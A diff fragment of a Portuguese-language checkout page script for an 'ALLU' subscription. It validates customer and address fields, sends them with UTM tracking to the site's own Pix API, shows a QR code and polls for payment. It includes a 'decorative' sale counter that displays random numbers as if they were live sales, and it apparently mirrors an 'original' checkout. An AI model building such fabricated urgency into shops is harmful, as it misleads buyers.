+    const email = document.getElementById('inpEmail').value.trim();
+    const phone = phoneInput.value;
+    const cpf = cpfInput.value;
+    const err = document.getElementById('step1Error');
+    if (name.split(' ').filter(Boolean).length < 2){ err.textContent = 'Digite seu nome completo.'; return; }
+    if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)){ err.textContent = 'Digite um e-mail válido.'; return; }
+    if (phone.replace(/\D/g,'').length < 10){ err.textContent = 'Digite um telefone válido com DDD.'; return; }
+    if (!isValidCPF(cpf)){ err.textContent = 'CPF inválido. Confira os números digitados.'; return; }
+    err.textContent = '';
+    customer.name = name; customer.email = email; customer.phone = phone; customer.document = cpf;
+    goToStep(2);
+  });
+
+  // ---- step 2 ----
+  document.getElementById('formStep2').addEventListener('submit', e=>{
+    e.preventDefault();
+    const required = ['inpCep','inpAddress','inpNumber','inpNeighborhood','inpCity','inpState'];
+    const err = document.getElementById('step2Error');
+    for (const id of required){
+      if (!document.getElementById(id).value.trim()){ err.textContent = 'Preencha todos os campos obrigatórios de entrega.'; return; }
+    }
+    err.textContent = '';
+    revealFrete();
+    goToStep(3);
+  });
+  document.getElementById('btnBack2').addEventListener('click', ()=>goToStep(1));
+  document.getElementById('btnBack3').addEventListener('click', ()=>goToStep(2));
+
+  // ---- step 3: gerar pix ----
+  document.getElementById('btnGeneratePix').addEventListener('click', async ()=>{
+    const btn = document.getElementById('btnGeneratePix');
+    btn.disabled = true;
+    btn.textContent = 'Gerando Pix…';
+    document.getElementById('pixError').textContent = '';
+
+    const reference = `ALLU-${slug}-${Date.now()}`;
+
+    // captura as UTMs coletadas pelo script da Utmify (window.utmParams é um URLSearchParams)
+    let tracking = {};
+    try {
+      if (window.utmParams) {
+        window.utmParams.forEach((value, key) => { tracking[key] = value; });
+      }
+    } catch (e) {}
+
+    try{
+      const res = await fetch('/api/create-pix', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({
+          amount: totalCents(),
+          description: `Assinatura ${productName} — ${planLabel}`,
+          reference,
+          customer,
+          tracking,
+        }),
+      });
+      const data = await res.json();
+      if (!res.ok) throw new Error(data.error || 'Não foi possível gerar o Pix agora.');
+
+      currentOrder = {
+        transaction_id: data.transaction_id,
+        qr_code: data.qr_code,
+        customer,
+        address: {
+          cep: document.getElementById('inpCep').value,
+          address: document.getElementById('inpAddress').value,
+          number: document.getElementById('inpNumber').value,
+          complement: document.getElementById('inpComplement').value,
+          neighborhood: document.getElementById('inpNeighborhood').value,
+          city: document.getElementById('inpCity').value,
+          state: document.getElementById('inpState').value,
+        },
+        product: { name: productName, plan: planLabel, image: meta.image || null },
+        amounts: { subtotal: subtotalCents, frete: freteCents, total: totalCents() },
+      };
+
+      document.getElementById('pixSetup').hidden = true;
+      document.getElementById('pixResult').hidden = false;
+      document.getElementById('pixCopiaCola').value = data.qr_code;
+
+      document.getElementById('pixQr').innerHTML = '';
+      new QRCode(document.getElementById('pixQr'), {
+        text: data.qr_code,
+        width: 220,
+        height: 220,
+        colorDark: '#2A292E',
+        colorLight: '#ffffff',
+      });
+
+      startPolling(data.transaction_id);
+    }catch(err){
+      document.getElementById('pixError').textContent = err.message;
+      btn.disabled = false;
+      btn.textContent = 'Gerar Pix e finalizar';
+    }
+  });
+
+  document.getElementById('btnCopyPix').addEventListener('click', ()=>{
+    const ta = document.getElementById('pixCopiaCola');
+    ta.select();
+    const b = document.getElementById('btnCopyPix');
+    const done = () => { b.textContent = 'Copiado!'; setTimeout(()=>b.textContent = 'Copiar', 1800); };
+    if (navigator.clipboard) navigator.clipboard.writeText(ta.value).then(done).catch(()=>{ document.execCommand('copy'); done(); });
+    else { document.execCommand('copy'); done(); }
+  });
+
+  let pollTimer = null;
+  function startPolling(id){
+    let attempts = 0;
+    const MAX_ATTEMPTS = 120; // ~10 min a cada 5s
+    document.getElementById('pixStatus').innerHTML = '<span class="spinner"></span> Aguardando confirmação do pagamento…';
+    clearInterval(pollTimer);
+    pollTimer = setInterval(async ()=>{
+      attempts++;
+      try{
+        const res = await fetch(`/api/check-payment?id=${encodeURIComponent(id)}`);
+        const data = await res.json();
+        if (data.status === 'approved'){
+          clearInterval(pollTimer);
+          sessionStorage.setItem('allu_order', JSON.stringify(currentOrder));
+          window.location.href = '/obrigado/';
+          return;
+        }
+        if (['failed','refunded','chargeback'].includes(data.status)){
+          clearInterval(pollTimer);
+          document.getElementById('pixStatus').textContent = 'Pagamento não foi confirmado.';
+          document.getElementById('btnRetryPix').hidden = false;
+          return;
+        }
+      }catch(err){}
+      if (attempts >= MAX_ATTEMPTS){
+        clearInterval(pollTimer);
+        document.getElementById('pixStatus').textContent = 'Ainda não recebemos a confirmação. Tente novamente em instantes.';
+        document.getElementById('btnRetryPix').hidden = false;
+      }
+    }, 5000);
+  }
+
+  document.getElementById('btnRetryPix').addEventListener('click', ()=>{
+    clearInterval(pollTimer);
+    document.getElementById('pixResult').hidden = true;
+    document.getElementById('pixSetup').hidden = false;
+    document.getElementById('btnRetryPix').hidden = true;
+    const btn = document.getElementById('btnGeneratePix');
+    btn.disabled = false;
+    btn.textContent = 'Gerar Pix e finalizar';
+  });
+
+  // ---- sale counter (decorativo, mesmo recurso já nativo do checkout original) ----
+  let count = 32;
+  setInterval(()=>{
+    count += (Math.random() > 0.5 ? 1 : -1);
+    count = Math.max(28, Math.min(50, count));
+    document.getElementById('saleCount').textContent = count;
+  }, 4000);
+
+  goToStep(1);
+
+  // ---- apenas para depuração local: ?debugStep=3&autoPix=1 pula direto pra etapa 3 ----
+  const debugStep = parseInt(params.get('debugStep'), 10);
+  if (debugStep) {
+    customer.name = customer.name || 'Maria Teste Silva';
+    customer.email = customer.email || 'maria@example.com';
+    customer.phone = customer.phone || '(31) 99999-8888';
+    customer.document = customer.document || '123.456.789-09';
+    if (debugStep >= 3) revealFrete();
+    goToStep(debugStep);
+    if (debugStep === 3 && params.get('autoPix') === '1') {
+      setTimeout(() => document.getElementById('btnGeneratePix').click(), 300);
+    }
+  }
+})();
+</script>
+</body>
+</html>
